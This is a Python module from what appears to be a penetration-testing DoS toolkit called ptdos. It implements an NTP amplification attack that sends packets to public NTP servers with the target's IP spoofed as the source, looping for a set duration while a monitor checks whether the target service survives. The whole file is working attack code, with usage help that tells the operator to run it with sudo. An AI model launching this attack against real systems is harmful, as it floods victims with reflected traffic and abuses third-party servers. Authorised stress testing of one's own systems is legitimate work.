"""ptdos extension that adds a NTP amplification attack."""
# python3 ptdos.py -a ntpampl -dst 192.168.0.80 -d 5

# own libs
from monitoring.ptcheckservice import attack_append_out_data, attack_checkservice_review, print_error
from infrastructure import factory
from misc.pt_socket import create_socket
from misc.pt_ntp import create_ntp_packet_list
# external libs
from dataclasses import dataclass
from time import time, asctime, sleep
from ptlibs.ptmisclib import out_if, out_ifnot, ptprint
from random import choice
from socket import error


@dataclass
class NtpAmpl:

    category: str
    name: str

    def launch_attack(self, args, dst, duration, use_json, json_obj, json_no, monitoring, att_start_t_epoch, att_start_t_asc) -> None:
        """Main function responsible for launching the attack."""
        packets = 0

        # create list of NTP packets
        ptprint(out_ifnot(f"Loading list of NTP servers and creating packets.", "INFO", use_json))
        ntp_packets = create_ntp_packet_list(dst)
        ptprint(out_ifnot(f"Loading NTP server and creation of NTP packets successfully completed.", "INFO", use_json))

        # create socket
        sock = create_socket(self.name)

        # checkservice start monitoring
        monitoringprocess = monitoring.call_checkservice_repeatedly(use_json)

        try:
            while True:  # while loop to stop the attack after time specified in duration runs out
                if time() - att_start_t_epoch >= duration:
                    sock.close()  # stop attack
                    monitoringprocess()  # stop checkservice end monitoring
                    att_end_t_asc = asctime()  # save attack's ending time
                    sleep(1)  # wait for 1 second to stop the monitoring process
                    attack_checkservice_review(monitoring, use_json, json_obj, json_no, self.name)
                    break

                try:
                    element = choice(ntp_packets)  # choose random NTP packet from list
                    sock.sendto(element.ntp_packet, (element.ntp_server_ip, element.sport))  # send packet to ntp server with spoofed src IP
                    packets += 1

                except error as serr:
                    ptprint(out_ifnot(f"Close socket due to {serr}.", "ERROR", use_json))
                    sock.close()  # close socket
                    sleep(0.25)  # wait for closing socket
                    ptprint(out_ifnot("Create new socket.", "INFO", use_json))
                    sock = create_socket(self.name)
                    ptprint(out_ifnot(f"Continue {self.name} attack with new socket.", "INFO", use_json))

            # append attack outcome data to JSON object or print info to console
            attack_append_out_data(use_json, json_obj, json_no, self.name, duration, att_start_t_asc, att_end_t_asc, dst, packets)

            # append checkservice outcome data to JSON object or print info to console
            monitoring.checkservice_append_out_data(json_obj, use_json, json_no)

            # print JSON object to console if self.use_json == TRUE
            ptprint(out_if(json_obj.get_all_json(), "", use_json))

            return

        except BaseException as err:
            sock.close()  # stop attack
            monitoringprocess()  # stop checkservice end monitoring
            return print_error(json_obj, use_json, json_no, self.name, err.args[0])

    @staticmethod
    def make_help():
        """Help for attack printed out in main file ptdos.py."""
        return [
            {"NTP Amplification attack options": [
                ["NOTE: Run this DoS with sudo."],
                ["-a", "--attack", "<attack>", "Attack name - ntpampl"],
                ["-d", "--duration", "<duration>", "Attack duration in seconds. Default 10 seconds."],
                ["-dst", "--destination", "<dst>", "IP of the target. It will be spoofed as source of NTP request."],
            ]
            }
        ]

    @staticmethod
    def make_args(parser):
        """Specify arguments needed for the attack"""


def register() -> None:
    """Register attack in factory."""
    factory.register("ntpampl", NtpAmpl)
